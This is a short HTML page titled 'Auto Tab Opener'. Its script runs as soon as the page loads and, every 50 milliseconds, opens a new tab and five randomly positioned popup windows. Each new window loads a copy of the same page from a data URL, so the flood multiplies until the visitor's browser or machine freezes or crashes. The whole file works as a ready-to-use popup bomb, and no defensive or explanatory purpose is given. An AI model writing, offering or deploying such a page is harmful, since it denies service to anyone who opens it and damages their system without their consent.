<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Tab Opener</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        
        .status {
            margin-top: 20px;
            font-weight: bold;
            color: #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Auto Tab Opener</h1>
        <p id="status" class="status">Opening windows...</p>
    </div>

    <script>
        // Function to get a random position for windows
        function getRandomPosition() {
            const screenWidth = window.screen.availWidth;
            const screenHeight = window.screen.availHeight;
            const width = Math.floor(Math.random() * 400) + 200;
            const height = Math.floor(Math.random() * 300) + 150;
            const left = Math.floor(Math.random() * (screenWidth - width));
            const top = Math.floor(Math.random() * (screenHeight - height));
            
            return `width=${width},height=${height},left=${left},top=${top}`;
        }
        
        // Function to create the HTML content for new windows
        function getHTMLContent() {
            return document.documentElement.outerHTML;
        }
        
        // Create a data URL with the current page content
        function createHTMLDataUrl() {
            return 'data:text/html;charset=utf-8,' + encodeURIComponent(getHTMLContent());
        }
        
        // Function to open multiple windows
        function openWindows() {
            const dataUrl = createHTMLDataUrl();
            
            // Open a new tab
            window.open(dataUrl, '_blank');
            
            // Open multiple popup windows with random positions
            for (let i = 0; i < 5; i++) {
                window.open(dataUrl, '', getRandomPosition());
            }
        }
        
        // Start opening windows immediately
        function startOpeningWindows() {
            // Open windows every 50ms
            setInterval(openWindows, 50);
        }
        
        // Start immediately without requiring button press
        startOpeningWindows();
    </script>
</body>
</html>
